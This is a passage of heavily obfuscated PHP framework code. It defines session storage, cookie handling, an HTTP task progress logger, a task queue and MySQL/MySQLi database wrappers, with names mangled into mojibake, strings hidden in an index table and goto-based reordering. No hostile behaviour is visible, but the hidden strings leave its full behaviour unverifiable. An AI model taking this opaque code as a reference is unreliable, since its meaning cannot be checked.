self::get($_SERVER[$ÜÎ„Ñ„î[1602]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ç²‰±úÆ =& $_SERVER[Ôó‡è­ƒ]; static $éñ•ç‘ı = false; if ($éñ•ç‘ı) { return $éñ•ç‘ı; } $ ŞÃÆü® = $GLOBALS[$ç²‰±úÆ[6]][$ç²‰±úÆ[348]]; self::$sessionTime = $ ŞÃÆü®[$ç²‰±úÆ[1611]]; $£Ç¤ÓñÍ = isset($GLOBALS[$ç²‰±úÆ[1612]]) ? $GLOBALS[$ç²‰±úÆ[1612]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($£Ç¤ÓñÍ)) { self::$sessionSign = Cookie::get($£Ç¤ÓñÍ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($£Ç¤ÓñÍ, self::$sessionSign, self::$sessionTime); $Î¦Ô¢Ï€ = $ ŞÃÆü®[$ç²‰±úÆ[1613]]; $Å°›Ïó = $ ŞÃÆü®[$Î¦Ô¢Ï€]; $¯Æ«Ù©³ = $ ŞÃÆü®[$ç²‰±úÆ[826]]; switch ($Î¦Ô¢Ï€) { case $ç²‰±úÆ[21]: self::$handle = Model($ç²‰±úÆ[827]); break; case $ç²‰±úÆ[828]: self::$handle = new CacheRedis($Å°›Ïó, $¯Æ«Ù©³); break; case $ç²‰±úÆ[829]: self::$handle = new CacheMemcached($Å°›Ïó, $¯Æ«Ù©³); break; case $ç²‰±úÆ[196]: $Å°›Ïó[$ç²‰±úÆ[78]] = $Å°›Ïó[$ç²‰±úÆ[78]] . $ç²‰±úÆ[1614]; self::$handle = new CacheFile($Å°›Ïó, $¯Æ«Ù©³); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $éñ•ç‘ı = new self(); return $éñ•ç‘ı; } public static function getBySign($Ü©ù“Ş¨) { CacheLock::lock($Ü©ù“Ş¨); $æåóÀÊ = self::$handle->get($Ü©ù“Ş¨); CacheLock::unlock($Ü©ù“Ş¨); $æåóÀÊ = unserialize($æåóÀÊ); return is_array($æåóÀÊ) ? $æåóÀÊ : array(); } public static function setBySign($áÍÅõÜÏ, $ÖÁæ²Öè) { CacheLock::lock($áÍÅõÜÏ); self::$handle->set($áÍÅõÜÏ, serialize($ÖÁæ²Öè), self::$sessionTime); CacheLock::unlock($áÍÅõÜÏ); } public static function sign($ÊÊ¹ª½ı = false) { $ÊÊ¹ª½ı && (self::$sessionSign = $ÊÊ¹ª½ı); self::init(); return self::$sessionSign; } public static function set($„è¾œ£, $è®ç¡Êë = false) { self::init(); if (is_array($„è¾œ£)) { foreach ($„è¾œ£ as $ş–àïâ => $‘Û¥÷ı«) { array_set_value(self::$data, $ş–àïâ, $‘Û¥÷ı«); } } else { array_set_value(self::$data, $„è¾œ£, $è®ç¡Êë); } self::setBySign(self::$sessionSign, self::$data); } public static function get($’’ŞåƒÍ = false) { self::init(); if (!$’’ŞåƒÍ) { return self::$data; } return array_get_value(self::$data, $’’ŞåƒÍ); } public static function remove($Á¼±½Ç) { self::init(); unset(self::$data[$Á¼±½Ç]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ôó‡è­ƒ][831])) { self::$handle->clearTimeout(); } } } goto B¹Ñ‘âÚ; A¯ç·Å¦£: class TaskHttp extends Task { protected function startAfter() { $›ØÂÜõ» =& $_SERVER[Ôó‡è­ƒ]; $ÖñÄ†åÊ =& $this->task; $ÖñÄ†åÊ[$›ØÂÜõ»[1726]] = 1; Hook::bind($›ØÂÜõ»[1695], array($this, $›ØÂÜõ»[1727])); Hook::bind($›ØÂÜõ»[1697], array($this, $›ØÂÜõ»[1728])); Hook::bind($›ØÂÜõ»[1699], array($this, $›ØÂÜõ»[1729])); } protected function endAfter() { $¨ßŒ„Ì =& $_SERVER[Ôó‡è­ƒ]; Hook::unbind($¨ßŒ„Ì[1695], array($this, $¨ßŒ„Ì[1727])); Hook::unbind($¨ßŒ„Ì[1697], array($this, $¨ßŒ„Ì[1728])); Hook::unbind($¨ßŒ„Ì[1699], array($this, $¨ßŒ„Ì[1729])); } public function progressStart($ë––‡Û) { $ÉàÕöñÁ =& $_SERVER[Ôó‡è­ƒ]; $ÄšëÍ„ = curl_getinfo($ë––‡Û); self::log($ÉàÕöñÁ[1730] . $ÄšëÍ„[$ÉàÕöñÁ[306]]); self::valueSet($this->task[$ÉàÕöñÁ[396]], $this->task); } public function progressEnd($Îç€ü´á) { $ïæ®âŸà =& $_SERVER[Ôó‡è­ƒ]; self::log($ïæ®âŸà[1731] . $this->task[$ïæ®âŸà[396]]); $this->end(); } public function progress($ÑğØœùÑ, $™Üòóé, $‡ß·‡ûø, $Õ¿ÉŒË, $“îÏ«) { $…Å€Âûë =& $_SERVER[Ôó‡è­ƒ]; $ÑÍ¡àˆÒ =& $this->task; if ($“îÏ« > 0) { $ÑÍ¡àˆÒ[$…Å€Âûë[784]] = $ÑÍ¡àˆÒ[$…Å€Âûë[784]] == 0 ? $Õ¿ÉŒË : $ÑÍ¡àˆÒ[$…Å€Âûë[784]]; $ÑÍ¡àˆÒ[$…Å€Âûë[1656]] = $“îÏ«; } else { if ($‡ß·‡ûø > 0) { $ÑÍ¡àˆÒ[$…Å€Âûë[784]] = $ÑÍ¡àˆÒ[$…Å€Âûë[784]] == 0 ? $™Üòóé : $ÑÍ¡àˆÒ[$…Å€Âûë[784]]; $ÑÍ¡àˆÒ[$…Å€Âûë[1656]] = $‡ß·‡ûø; } } $this->update(); self::log("\160\x72\157\147\x72\145\163\x73\110\164\164\x70\72\x64\157\167\156\72{$‡ß·‡ûø}\x2f{$™Üòóé}\x3b\x20\165\x70\154\157\141\x64\x3a{$“îÏ«}\x2f{$Õ¿ÉŒË}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\121\x75\x65\x75\145\x4c\145\x6e\x67\164\x68"; const QUEUE_DATA = "\164\141\163\153\x51\165\x65\x75\145\x44\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($Âç÷ËÜ², $ŸŒÒâÎ» = array(), $«Ö­Á­ = '', $óá¬¢®• = '') { $¿•ÀöÕÙ =& $_SERVER[Ôó‡è­ƒ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($óá¬¢®• && array_find_by_field(self::$listData, $¿•ÀöÕÙ[95], $óá¬¢®•)) { return !0; } self::$listData[] = array($¿•ÀöÕÙ[263] => $Âç÷ËÜ², $¿•ÀöÕÙ[1732] => $ŸŒÒâÎ», $¿•ÀöÕÙ[447] => $«Ö­Á­, $¿•ÀöÕÙ[95] => $óá¬¢®•); return !0; } public static function addSubmit() { $‹ÊÇÓ·¥ =& $_SERVER[Ôó‡è­ƒ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($‹ÊÇÓ·¥[1733] . json_encode_force(array_to_keyvalue(self::$listData, $‹ÊÇÓ·¥[12], $‹ÊÇÓ·¥[447])), $‹ÊÇÓ·¥[1734]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ş¦Âè²ö, $Åî¸‡£× = array(), $úÉè©²› = '', $ş‡í¡Ëº = '') { $Û›®†€ =& $_SERVER[Ôó‡è­ƒ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ì°ãáİû = self::getAll(); if ($ş‡í¡Ëº && array_find_by_field($ì°ãáİû, $Û›®†€[95], $ş‡í¡Ëº)) { return !0; } $ì°ãáİû[] = array($Û›®†€[263] => $Ş¦Âè²ö, $Û›®†€[1732] => $Åî¸‡£×, $Û›®†€[447] => $úÉè©²›, $Û›®†€[95] => $ş‡í¡Ëº); write_log($Û›®†€[1733] . $úÉè©²›, $Û›®†€[1734]); self::setAll($ì°ãáİû); return !0; } public static function run() { $²Õ¡Õ¢ =& $_SERVER[Ôó‡è­ƒ]; $—«•ŠŸ˜ = self::getAll(); $ÃÓñ€íş = array_shift($—«•ŠŸ˜); if (!$ÃÓñ€íş) { return !1; } self::setAll($—«•ŠŸ˜); $ªÓı´‡’ = timeFloat(); try { Hook::apply($ÃÓñ€íş[$²Õ¡Õ¢[263]], $ÃÓñ€íş[$²Õ¡Õ¢[1732]]); } catch (Exception $·ÕáÔ£) { } $Š¾³”ùú = number_format(timeFloat() - $ªÓı´‡’, 3) . $²Õ¡Õ¢[1671]; write_log($²Õ¡Õ¢[1735] . $ÃÓñ€íş[$²Õ¡Õ¢[447]] . $²Õ¡Õ¢[1736] . $Š¾³”ùú, $²Õ¡Õ¢[1734]); return !0; } public static function count() { $Ä­ÄÏŸã = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Ä­ÄÏŸã) { return 0; } return intval($Ä­ÄÏŸã); } public static function getAll() { $ÑÕ«ŸÏÄ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ÑÕ«ŸÏÄ) { return array(); } return $ÑÕ«ŸÏÄ; } public static function setAll($ñÓÀ…Üá) { $×¸íæÒŠ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ñÓÀ…Üá), $×¸íæÒŠ); Cache::set(self::QUEUE_DATA, $ñÓÀ…Üá, $×¸íæÒŠ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Éù¨ä‰ş, $ßĞÛÅÜÒ = 5.0) { if (!$Éù¨ä‰ş) { return; } $Ğî˜ñõµ = Cache::get($Éù¨ä‰ş); if (!$Ğî˜ñõµ || timeFloat() - floatVal($Ğî˜ñõµ) >= $ßĞÛÅÜÒ) { Cache::set($Éù¨ä‰ş, timeFloat(), $ßĞÛÅÜÒ * 10); return !0; } return !1; } public static function timeLimitCall($Ù’š¿Ì‘, $¹ï àù±, $ô­©º½ı, $‹ÙÖ‡á‘ = 5.0) { $•°²Àö› =& $_SERVER[Ôó‡è­ƒ]; if (!$Ù’š¿Ì‘ || !$¹ï àù±) { return; } self::$asyncAdd = !0; $é€’§¡³ = $•°²Àö›[1737]; $®˜Ø²ÁÚ = Cache::get($é€’§¡³, !0); $æÈô€ºë = array($•°²Àö›[1738] => timeFloat(), $•°²Àö›[1739] => timeFloat(), $•°²Àö›[263] => $¹ï àù±, $•°²Àö›[1732] => $ô­©º½ı, $•°²Àö›[200] => $‹ÙÖ‡á‘); if (is_array($®˜Ø²ÁÚ[$Ù’š¿Ì‘])) { $æÈô€ºë[$•°²Àö›[1739]] = $®˜Ø²ÁÚ[$Ù’š¿Ì‘][$•°²Àö›[1739]]; } if (is_array($®˜Ø²ÁÚ[$Ù’š¿Ì‘])) { if (timeFloat() - $®˜Ø²ÁÚ[$Ù’š¿Ì‘][$•°²Àö›[1738]] < $æÈô€ºë[$•°²Àö›[200]] * 0.3) { return; } $æÈô€ºë[$•°²Àö›[1739]] = $®˜Ø²ÁÚ[$Ù’š¿Ì‘][$•°²Àö›[1739]]; } $®˜Ø²ÁÚ[$Ù’š¿Ì‘] = $æÈô€ºë; Cache::set($é€’§¡³, $®˜Ø²ÁÚ, 60); Cache::removeMemory($é€’§¡³); write_log($•°²Àö›[1740] . $Ù’š¿Ì‘ . $•°²Àö›[71] . $¹ï àù±, $•°²Àö›[1734]); } public static function timeLimitCallLoop() { $Û£”â®ù =& $_SERVER[Ôó‡è­ƒ]; $÷Ø÷¾˜ = array($Û£”â®ù[1741]); $©èí±ƒÀ = in_array(strtolower(ACTION), $÷Ø÷¾˜); if (!$©èí±ƒÀ && !self::$asyncAdd) { return; } $Å·ÓŞÅñ = $Û£”â®ù[1737]; $®µÈ×‡õ = Cache::get($Å·ÓŞÅñ, !0); if (!$®µÈ×‡õ || count($®µÈ×‡õ) <= 0) { return; } $ËÅãõá° = !1; $èœ³ñä« = timeFloat(); $Ùå˜Ñ¡ = array(); foreach ($®µÈ×‡õ as $ù¢İğ Ÿ => $¯Òş±Ù¿) { if ($èœ³ñä« - $¯Òş±Ù¿[$Û£”â®ù[1739]] > $¯Òş±Ù¿[$Û£”â®ù[200]]) { $ËÅãõá° = !0; try { Hook::apply($¯Òş±Ù¿[$Û£”â®ù[263]], $¯Òş±Ù¿[$Û£”â®ù[1732]]); write_log($Û£”â®ù[1742] . $ù¢İğ Ÿ . $Û£”â®ù[71] . $¯Òş±Ù¿[$Û£”â®ù[263]] . $Û£”â®ù[1743] . ACTION, $Û£”â®ù[1734]); } catch (Exception $“‘ÇâÇŸ) { } continue; } $Ùå˜Ñ¡[$ù¢İğ Ÿ] = $¯Òş±Ù¿; } if (!$ËÅãõá°) { return; } if (!$Ùå˜Ñ¡) { return Cache::remove($Å·ÓŞÅñ); } Cache::set($Å·ÓŞÅñ, $Ùå˜Ñ¡, 60); Cache::removeMemory($Å·ÓŞÅñ); } public static function finished($®ğØ, $†ëĞ‹…) { $¾¶¬í¸à =& $_SERVER[Ôó‡è­ƒ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¾¶¬í¸à[263] => $®ğØ, $¾¶¬í¸à[1732] => $†ëĞ‹…); } private static function finishedRun() { $ÑúÈğ“² =& $_SERVER[Ôó‡è­ƒ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¬•ÖÁ¸™) { try { Hook::apply($¬•ÖÁ¸™[$ÑúÈğ“²[263]], $¬•ÖÁ¸™[$ÑúÈğ“²[1732]]); } catch (Exception $¼‡ŒşÓ¥) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto c°„Û¶”À«; CâóšßÇÉÃ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ìö³õË† = '', $¬Ñ¿ˆã“ = 0) { if (is_string($ìö³õË†) && $ìö³õË† != $_SERVER[Ôó‡è­ƒ][12]) { $this->prefix = $ìö³õË†; } if (is_numeric($¬Ñ¿ˆã“) && $¬Ñ¿ˆã“ > 0) { $this->expire = $¬Ñ¿ˆã“; } } public static function getInstance() { static $ƒä–·©ë; if ($ƒä–·©ë === null) { $ƒä–·©ë = new self(); } return $ƒä–·©ë; } private static $cookieDisable = false; public static function disable($ ‹ŸƒÑ¬) { self::$cookieDisable = $ ‹ŸƒÑ¬; } private static $sameCookieSet = array(); public static function set($‘²»ÛÜ¥, $É·„‘ìÎ, $ıãöéÓÚ = 0, $¸êÛıÚ« = false, $ùÊ®å³ã = false) { $Ï¼ŞÑÊ¹ =& $_SERVER[Ôó‡è­ƒ]; if (self::$cookieDisable) { return; } if (!$ıãöéÓÚ) { $ıãöéÓÚ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$‘²»ÛÜ¥]) && self::$sameCookieSet[$‘²»ÛÜ¥] == $É·„‘ìÎ . $ıãöéÓÚ) { return; } self::$sameCookieSet[$‘²»ÛÜ¥] = $É·„‘ìÎ . $ıãöéÓÚ; if (!$ùÊ®å³ã) { $ùÊ®å³ã = str_replace(HOST, $Ï¼ŞÑÊ¹[12], APP_HOST); $ùÊ®å³ã = _get($GLOBALS, $Ï¼ŞÑÊ¹[882], $ùÊ®å³ã); } $ù²ÃÌâà = $Ï¼ŞÑÊ¹[12]; setcookie($‘²»ÛÜ¥, $É·„‘ìÎ, time() + $ıãöéÓÚ, $Ï¼ŞÑÊ¹[8] . trim($ùÊ®å³ã, $Ï¼ŞÑÊ¹[8]) . $ù²ÃÌâà, !1, !1, $¸êÛıÚ«); } public static function setSafe($¸Ä•˜¦¬, $”«¬¨æÈ, $Ô¯É£ = 0) { self::set($¸Ä•˜¦¬, $”«¬¨æÈ, $Ô¯É£, !0); } public static function get($üùŠÚ©²) { static $šµŸ¥à = false; if (!$šµŸ¥à) { self::initHeaderCookie(); $šµŸ¥à = !0; } return isset($_COOKIE[$üùŠÚ©²]) ? $_COOKIE[$üùŠÚ©²] : !1; } private static function initHeaderCookie() { $¶Êõµ  =& $_SERVER[Ôó‡è­ƒ]; if (!isset($_SERVER[$¶Êõµ [883]]) || !$_SERVER[$¶Êõµ [883]]) { return; } $™—ë†ëÍ = explode($¶Êõµ [71], $_SERVER[$¶Êõµ [883]]); foreach ($™—ë†ëÍ as $šñĞõÒø) { $šñĞõÒø = explode($¶Êõµ [884], $šñĞõÒø); if (count($šñĞõÒø) != 2 || !isset($šñĞõÒø[1])) { continue; } $_COOKIE[trim($šñĞõÒø[0])] = trim($šñĞõÒø[1]); } } public static function remove($ï±»‡ÃŒ, $åÆµ­Û = false) { unset($_COOKIE[$ï±»‡ÃŒ]); self::set($ï±»‡ÃŒ, $_SERVER[Ôó‡è­ƒ][12], 1, $åÆµ­Û); } } class DbMysql extends Db { public function __construct($†ÌÅÙÈö = '') { $×Ú£ó´Ë =& $_SERVER[Ôó‡è­ƒ]; if (!extension_loaded($×Ú£ó´Ë[802])) { think_exception(think_lang($×Ú£ó´Ë[14]) . $×Ú£ó´Ë[885]); } if (!empty($†ÌÅÙÈö)) { $this->config = $†ÌÅÙÈö; if (empty($this->config[$×Ú£ó´Ë[17]])) { $this->config[$×Ú£ó´Ë[17]] = $×Ú£ó´Ë[12]; } } } public function connect($ùßÈŞ·ï = '', $ÑåÙåÕö = 0, $éÕúıíÏ = false) { $´ÍÆ­Ú =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->linkID[$ÑåÙåÕö])) { if (empty($ùßÈŞ·ï)) { $ùßÈŞ·ï = $this->config; } $åû„ìËÀ = $ùßÈŞ·ï[$´ÍÆ­Ú[886]] . ($ùßÈŞ·ï[$´ÍÆ­Ú[887]] ? "\72{$ùßÈŞ·ï[$´ÍÆ­Ú[887]]}" : $´ÍÆ­Ú[12]); $­ÆŞëš = !empty($ùßÈŞ·ï[$´ÍÆ­Ú[17]][$´ÍÆ­Ú[18]]) ? $ùßÈŞ·ï[$´ÍÆ­Ú[17]][$´ÍÆ­Ú[18]] : $this->pconnect; if ($­ÆŞëš) { $this->linkID[$ÑåÙåÕö] = mysql_pconnect($åû„ìËÀ, $ùßÈŞ·ï[$´ÍÆ­Ú[888]], $ùßÈŞ·ï[$´ÍÆ­Ú[889]], 131072); } else { $this->linkID[$ÑåÙåÕö] = mysql_connect($åû„ìËÀ, $ùßÈŞ·ï[$´ÍÆ­Ú[888]], $ùßÈŞ·ï[$´ÍÆ­Ú[889]], !0, 131072); } if (!$this->linkID[$ÑåÙåÕö] || !empty($ùßÈŞ·ï[$´ÍÆ­Ú[21]]) && !mysql_select_db($ùßÈŞ·ï[$´ÍÆ­Ú[21]], $this->linkID[$ÑåÙåÕö])) { think_exception(mysql_error()); } $·÷Äã™İ = mysql_get_server_info($this->linkID[$ÑåÙåÕö]); mysql_query($´ÍÆ­Ú[890] . think_config($´ÍÆ­Ú[891]) . $´ÍÆ­Ú[58], $this->linkID[$ÑåÙåÕö]); if ($·÷Äã™İ > $´ÍÆ­Ú[892]) { mysql_query($´ÍÆ­Ú[893], $this->linkID[$ÑåÙåÕö]); } $this->connected = !0; if (1 != think_config($´ÍÆ­Ú[22])) { unset($this->config); } } return $this->linkID[$ÑåÙåÕö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ÿßš»³‡) { $€ÁËå´» =& $_SERVER[Ôó‡è­ƒ]; if (0 === stripos($Ÿßš»³‡, $€ÁËå´»[263])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿßš»³‡; if ($this->queryID) { $this->free(); } think_action_status($€ÁËå´»[23], 1); think_status($€ÁËå´»[24]); $this->queryID = mysql_query($Ÿßš»³‡, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($İ„¼–òÒ) { $ìÍ­ùÀ =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $İ„¼–òÒ; if ($this->queryID) { $this->free(); } think_action_status($ìÍ­ùÀ[25], 1); think_status($ìÍ­ùÀ[24]); $”·–çÒ = mysql_query($İ„¼–òÒ, $this->_linkID); $this->debug(); if (!1 === $”·–çÒ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ôó‡è­ƒ][894], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ì£Şú¹ = mysql_query($_SERVER[Ôó‡è­ƒ][895], $this->_linkID); $this->transTimes = 0; if (!$ì£Şú¹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¼½««µÂ = mysql_query($_SERVER[Ôó‡è­ƒ][896], $this->_linkID); $this->transTimes = 0; if (!$¼½««µÂ) { $this->error(); return !1; } } return !0; } private function getAll() { $‡éêì˜ = array(); if ($this->numRows > 0) { while ($ğ ‘¢ûğ = mysql_fetch_assoc($this->queryID)) { $‡éêì˜[] = $ğ ‘¢ûğ; } mysql_data_seek($this->queryID, 0); } return $‡éêì˜; } public function getFields($ù×”ìÃ‡) { $÷ùïë¸ =& $_SERVER[Ôó‡è­ƒ]; $¼ÔÇ¦øÅ = $this->query($÷ùïë¸[897] . $this->parseKey($ù×”ìÃ‡)); $¥±½Ï¨ò = array(); if ($¼ÔÇ¦øÅ) { foreach ($¼ÔÇ¦øÅ as $Œ«ÎÓü => $…ğÅŒ¨) { $¥±½Ï¨ò[$…ğÅŒ¨[$÷ùïë¸[31]]] = array($÷ùïë¸[32] => $…ğÅŒ¨[$÷ùïë¸[31]], $÷ùïë¸[33] => $…ğÅŒ¨[$÷ùïë¸[34]], $÷ùïë¸[35] => (bool) (strtoupper($…ğÅŒ¨[$÷ùïë¸[36]]) === $÷ùïë¸[898]), $÷ùïë¸[37] => $…ğÅŒ¨[$÷ùïë¸[38]], $÷ùïë¸[39] => strtolower($…ğÅŒ¨[$÷ùïë¸[40]]) == $÷ùïë¸[41], $÷ùïë¸[42] => strtolower($…ğÅŒ¨[$÷ùïë¸[43]]) == $÷ùïë¸[44]); } } return $¥±½Ï¨ò; } public function getTables($œİ¢ƒ©ƒ = '') { $æ¶â˜€× =& $_SERVER[Ôó‡è­ƒ]; if (!empty($œİ¢ƒ©ƒ)) { $¡èÔ® = $æ¶â˜€×[899] . $œİ¢ƒ©ƒ . $æ¶â˜€×[900]; } else { $¡èÔ® = $æ¶â˜€×[901]; } $¬¶µ©üá = $this->query($¡èÔ®); $¡–­‹€ = array(); foreach ($¬¶µ©üá as $ÔŸÎáÇ£ => $û·ƒŞŠ‰) { $¡–­‹€[$ÔŸÎáÇ£] = current($û·ƒŞŠ‰); } return $¡–­‹€; } public function replace($ñ‡•â…Ã, $îí›¦•Ù = array()) { $åÒçË‡ô =& $_SERVER[Ôó‡è­ƒ]; foreach ($ñ‡•â…Ã as $ïÍŠ¯¾Ã => $²¿ä²ê½) { $×™±şë‡ = $this->parseValue($²¿ä²ê½); if (is_scalar($×™±şë‡)) { $íš¯²³[] = $×™±şë‡; $é¼Ãï™[] = $this->parseKey($ïÍŠ¯¾Ã); } } $ß•°Å = $åÒçË‡ô[902] . $this->parseTable($îí›¦•Ù[$åÒçË‡ô[278]]) . $åÒçË‡ô[903] . implode($åÒçË‡ô[50], $é¼Ãï™) . $åÒçË‡ô[904] . implode($åÒçË‡ô[50], $íš¯²³) . $åÒçË‡ô[905]; return $this->execute($ß•°Å); } public function insertAll($ÂÛÜ Ó , $ò§“Ñ‹Ó = array(), $°İïš†Ò = false) { $İöâ¾¥ =& $_SERVER[Ôó‡è­ƒ]; if (!is_array($ÂÛÜ Ó [0])) { return !1; } $Úõ­–›Æ = array_keys($ÂÛÜ Ó [0]); $ÊÙ©Ÿ± = array(); foreach ($ÂÛÜ Ó  as $©îØƒ£) { $ÁÛìòÁï = array(); foreach ($©îØƒ£ as $ï’˜Ê”Â => $èòÕ¼¨) { $èòÕ¼¨ = $this->parseValue($èòÕ¼¨); if (is_scalar($èòÕ¼¨)) { $ÁÛìòÁï[] = $èòÕ¼¨; } } $ÊÙ©Ÿ±[] = $İöâ¾¥[259] . implode($İöâ¾¥[50], $ÁÛìòÁï) . $İöâ¾¥[905]; } array_walk($Úõ­–›Æ, array($this, $İöâ¾¥[906])); $øÖ£âÛï = ($°İïš†Ò ? $İöâ¾¥[907] : $İöâ¾¥[908]) . $İöâ¾¥[909] . $this->parseTable($ò§“Ñ‹Ó[$İöâ¾¥[278]]) . $İöâ¾¥[903] . implode($İöâ¾¥[50], $Úõ­–›Æ) . $İöâ¾¥[910] . implode($İöâ¾¥[50], $ÊÙ©Ÿ±); return $this->execute($øÖ£âÛï); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $éŠÆ•Á =& $_SERVER[Ôó‡è­ƒ]; $this->error = mysql_errno() . $éŠÆ•Á[4] . mysql_error($this->_linkID); if ($éŠÆ•Á[12] != $this->queryStr) { $this->error .= LNG($éŠÆ•Á[48]) . $this->queryStr; } think_trace($this->error, $éŠÆ•Á[12], $éŠÆ•Á[49]); return $this->error; } public function escapeString($‰Ø”­÷÷) { if ($this->_linkID) { return mysql_real_escape_string($‰Ø”­÷÷, $this->_linkID); } else { return mysql_escape_string($‰Ø”­÷÷); } } public function parseKey(&$†Õë€îÇ, $‰ÑŠ‡© = true) { $ˆÇ¨’œº =& $_SERVER[Ôó‡è­ƒ]; if ($‰ÑŠ‡©) { $†Õë€îÇ = $this->parseKeyCheck($†Õë€îÇ); } if ($†Õë€îÇ != $ˆÇ¨’œº[185] && !preg_match($ˆÇ¨’œº[911], $†Õë€îÇ)) { $†Õë€îÇ = $ˆÇ¨’œº[384] . trim($†Õë€îÇ, $ˆÇ¨’œº[384]) . $ˆÇ¨’œº[384]; } return $†Õë€îÇ; } } class DbMysqli extends Db { public function __construct($ÌËŠ”ñ = '') { $à„ìÓ =& $_SERVER[Ôó‡è­ƒ]; if (!extension_loaded($à„ìÓ[912])) { think_exception(think_lang($à„ìÓ[14]) . $à„ìÓ[913]); } if (!empty($ÌËŠ”ñ)) { $this->config = $ÌËŠ”ñ; if (empty($this->config[$à„ìÓ[17]])) { $this->config[$à„ìÓ[17]] = $à„ìÓ[12]; } } } public function connect($Ö¶Æ¼”Ì = '', $ï¨œßĞ¼ = 0) { $°Àç½¿å =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->linkID[$ï¨œßĞ¼])) { if (empty($Ö¶Æ¼”Ì)) { $Ö¶Æ¼”Ì = $this->config; } $this->linkID[$ï¨œßĞ¼] = new mysqli($Ö¶Æ¼”Ì[$°Àç½¿å[886]], $Ö¶Æ¼”Ì[$°Àç½¿å[888]], $Ö¶Æ¼”Ì[$°Àç½¿å[889]], $Ö¶Æ¼”Ì[$°Àç½¿å[21]], $Ö¶Æ¼”Ì[$°Àç½¿å[887]] ? intval($Ö¶Æ¼”Ì[$°Àç½¿å[887]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $êÕü«Æ = $this->linkID[$ï¨œßĞ¼]->server_version; $this->linkID[$ï¨œßĞ¼]->query($°Àç½¿å[890] . think_config($°Àç½¿å[891]) . $°Àç½¿å[58]); if ($êÕü«Æ > $°Àç½¿å[892]) { $this->linkID[$ï¨œßĞ¼]->query($°Àç½¿å[893]); } $this->connected = !0; if (1 != think_config($°Àç½¿å[22])) { unset($this->config); } } return $this->linkID[$ï¨œßĞ¼]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($—¹Ñ¸õ ) { $“©ÂúÉö =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—¹Ñ¸õ ; if ($this->queryID) { $this->free(); } think_action_status($“©ÂúÉö[23], 1); think_status($“©ÂúÉö[24]); $this->queryID = $this->_linkID->query($—¹Ñ¸õ ); if ($this->_linkID->more_results()) { while (($­“ôğñş = $this->_linkID->next_result()) != NULL) { $­“ôğñş->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ş¶Æ€ºâ) { $Î…Š®† =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ş¶Æ€ºâ; if ($this->queryID) { $this->free(); } think_action_status($Î…Š®†[25], 1); think_status($Î…Š®†[24]); $¹şÇş‘ã = $this->_linkID->query($Ş¶Æ€ºâ); $this->debug(); if (!1 === $¹şÇş‘ã) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡Ï›ú„Ÿ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¡Ï›ú„Ÿ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $É¢‚¾¬ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$É¢‚¾¬) { $this->error(); return !1; } } return !0; } private function getAll() { $Ê’¯­Åô 